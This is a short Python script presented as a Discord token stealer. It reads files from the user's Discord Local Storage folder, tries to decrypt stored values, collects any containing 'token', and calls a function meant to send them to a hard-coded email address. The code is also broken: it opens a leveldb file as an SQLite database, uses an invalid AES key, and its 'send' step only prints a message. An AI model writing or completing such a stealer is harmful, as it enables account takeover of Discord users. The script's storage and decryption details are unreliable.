import os
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    # Open the file containing the encrypted Discord cookies
    with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Discord', 'Local Storage', 'leveldb', '_index.ldb'), "rb") as f:
        raw = f.read()
        # Extract the key from the raw data
        key = raw[8:16]
        return key

def decrypt_value(encrypted_value):
    # Get the master key
    key = get_master_key()
    # Remove the first 3 bytes from the encrypted value
    encrypted_value = encrypted_value[3:]
    # Create a new cipher object using the key and AES-GCM mode
    cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[:12])
    # Decrypt the remaining bytes of the encrypted value
    decrypted_value = cipher.decrypt(encrypted_value[12:])
    # Return the decrypted value as a string
    return decrypted_value.decode()

def steal_cookies():
    # Connect to the Discord database
    conn = sqlite3.connect(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Discord', 'Local Storage', 'leveldb', '_index.ldb'))
    cursor = conn.cursor()
    # Select all values from the ItemTable
    cursor.execute("SELECT value FROM ItemTable")
    cookies = []
    for row in cursor.fetchall():
        # Decrypt the value
        decrypted_value = decrypt_value(row[0])
        # Check if the decrypted value contains the word 'token'
        if 'token' in decrypted_value:
            cookies.append(decrypted_value)
    conn.close()
    return cookies

def send_cookies_to_email(email):
    cookies = steal_cookies()
    if cookies:
        print("secess:", email)
    else:
        print("404 not found .")

send_cookies_to_email('kkara9009@gmail.com')
